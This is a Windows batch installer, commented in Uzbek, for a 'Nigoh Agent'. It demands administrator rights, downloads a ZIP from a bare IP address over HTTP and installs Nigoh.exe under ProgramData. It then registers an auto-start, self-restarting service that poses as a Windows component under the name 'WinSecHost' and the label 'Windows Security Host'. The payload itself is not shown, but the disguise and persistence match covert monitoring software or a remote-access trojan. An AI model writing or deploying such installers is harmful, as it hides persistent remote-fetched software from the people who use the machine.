@echo off
setlocal enabledelayedexpansion

:: ============================================================
::  Nigoh Agent - Installer
::  Admin huquqi bilan ishga tushiring
:: ============================================================

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [XATO] Iltimos, BAT faylni "Run as administrator" bilan ishga tushiring.
    pause
    exit /b 1
)

:: --- SOZLAMALAR ---
set DOWNLOAD_URL=http://89.39.94.50/media/Nigoh.zip
set INSTALL_DIR=C:\ProgramData\Nigoh
set CORE_DIR=%INSTALL_DIR%\Core
set TEMP_ZIP=%TEMP%\nigoh_setup.zip
set TEMP_EXTRACT=%TEMP%\nigoh_extract
set SERVICE_EXE=%INSTALL_DIR%\WatchdogService.exe
set SERVICE_NAME=WinSecHost
set SERVICE_DISPLAY=Windows Security Host
set SELF_DIR=%~dp0

echo.
echo [1/5] Yuklab olinayabdi: %DOWNLOAD_URL%
echo        (kuting...)
powershell -NoProfile -Command ^
  "try {" ^
  "  $wc = New-Object System.Net.WebClient;" ^
  "  $wc.DownloadFile('%DOWNLOAD_URL%', '%TEMP_ZIP%');" ^
  "  exit 0" ^
  "} catch { Write-Host $_.Exception.Message; exit 1 }"
if %errorlevel% neq 0 (
    echo [XATO] Yuklab olish muvaffaqiyatsiz. Server manzilini tekshiring.
    pause
    exit /b 1
)
if not exist "%TEMP_ZIP%" (
    echo [XATO] ZIP fayl saqlanmadi.
    pause
    exit /b 1
)

:: ZIP hajmi va formatini tekshiramiz
for %%F in ("%TEMP_ZIP%") do set ZIP_SIZE=%%~zF
if %ZIP_SIZE% LSS 100000 (
    echo [XATO] Yuklab olingan fayl juda kichik ^(%ZIP_SIZE% bayt^).
    echo        Server ZIP o'rniga xato sahifa yuborgan bo'lishi mumkin.
    del /f /q "%TEMP_ZIP%" >nul 2>&1
    pause
    exit /b 1
)
powershell -NoProfile -Command ^
  "Add-Type -Assembly System.IO.Compression.FileSystem;" ^
  "try { $z=[System.IO.Compression.ZipFile]::OpenRead('%TEMP_ZIP%'); $z.Dispose(); exit 0 } catch { exit 1 }"
if %errorlevel% neq 0 (
    echo [XATO] ZIP format noto'g'ri — fayl yuklanishda buzilgan.
    del /f /q "%TEMP_ZIP%" >nul 2>&1
    pause
    exit /b 1
)
echo        ZIP fayl tekshirildi: %ZIP_SIZE% bayt, format to'g'ri.

echo [2/5] Papkalar tayyorlanmoqda...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
:: Core ni tozalab qayta yaratamiz
if exist "%CORE_DIR%" rd /s /q "%CORE_DIR%"
mkdir "%CORE_DIR%"

echo [3/5] Arxivdan chiqarilmoqda...
:: Avval vaqtinchalik papkaga chiqaramiz
if exist "%TEMP_EXTRACT%" rd /s /q "%TEMP_EXTRACT%"
mkdir "%TEMP_EXTRACT%"

powershell -NoProfile -Command "Expand-Archive -Path '%TEMP_ZIP%' -DestinationPath '%TEMP_EXTRACT%' -Force"
if %errorlevel% neq 0 (
    echo [XATO] Arxivdan chiqarish muvaffaqiyatsiz.
    del /f /q "%TEMP_ZIP%" >nul 2>&1
    pause
    exit /b 1
)
del /f /q "%TEMP_ZIP%" >nul 2>&1

:: ZIP ichidagi papkani topib Core ga ko'chiramiz (qanday nomlangan bo'lmasin)
set FOUND=0
for /d %%D in ("%TEMP_EXTRACT%\*") do (
    if exist "%%D\Nigoh.exe" (
        echo        ZIP ichidan topildi: %%D
        xcopy /s /e /y /q "%%D\" "%CORE_DIR%\" >nul 2>&1
        set "FOUND=1"
    )
)
:: Agar papkasiz, to'g'ridan-to'g'ri ildizda bo'lsa
if exist "%TEMP_EXTRACT%\Nigoh.exe" (
    xcopy /s /e /y /q "%TEMP_EXTRACT%\" "%CORE_DIR%\" >nul 2>&1
    set "FOUND=1"
)

rd /s /q "%TEMP_EXTRACT%" >nul 2>&1

if "%FOUND%"=="0" (
    echo [XATO] ZIP ichida Nigoh.exe topilmadi.
    pause
    exit /b 1
)

if not exist "%CORE_DIR%\Nigoh.exe" (
    echo [XATO] Core papkasiga Nigoh.exe ko'chirilmadi.
    pause
    exit /b 1
)
echo        Nigoh.exe muvaffaqiyatli joylashtirildi: %CORE_DIR%

echo [4/5] Watchdog service o'rnatilmoqda...
if not exist "%SELF_DIR%WatchdogService.exe" (
    echo [XATO] WatchdogService.exe topilmadi: %SELF_DIR%WatchdogService.exe
    echo        install.bat va WatchdogService.exe bir papkada bo'lishi kerak.
    pause
    exit /b 1
)
copy /y "%SELF_DIR%WatchdogService.exe" "%SERVICE_EXE%" >nul
if %errorlevel% neq 0 (
    echo [XATO] WatchdogService.exe ni ko'chirib bo'lmadi.
    pause
    exit /b 1
)
echo        WatchdogService.exe o'rnatildi.

sc query %SERVICE_NAME% >nul 2>&1
if %errorlevel% equ 0 (
    sc stop %SERVICE_NAME% >nul 2>&1
    timeout /t 2 /nobreak >nul
    sc delete %SERVICE_NAME% >nul 2>&1
    timeout /t 1 /nobreak >nul
)

sc create %SERVICE_NAME% binpath= "\"%SERVICE_EXE%\"" start= auto DisplayName= "%SERVICE_DISPLAY%"
sc description %SERVICE_NAME% "Windows Security Host background service"
sc failure %SERVICE_NAME% reset= 60 actions= restart/3000/restart/5000/restart/10000

echo [5/5] Service ishga tushirilmoqda...
sc start %SERVICE_NAME%
if %errorlevel% neq 0 (
    echo [OGOHLANTIRISH] Service ishga tushmadi. Keyingi qayta yoqishda avtomatik boshlanadi.
) else (
    echo        Service muvaffaqiyatli ishga tushdi.
)

echo.
echo ============================================================
echo  O'rnatish muvaffaqiyatli tugadi!
echo  Service: %SERVICE_NAME%  ^|  Joyi: %INSTALL_DIR%
echo ============================================================
echo.
pause
exit /b 0
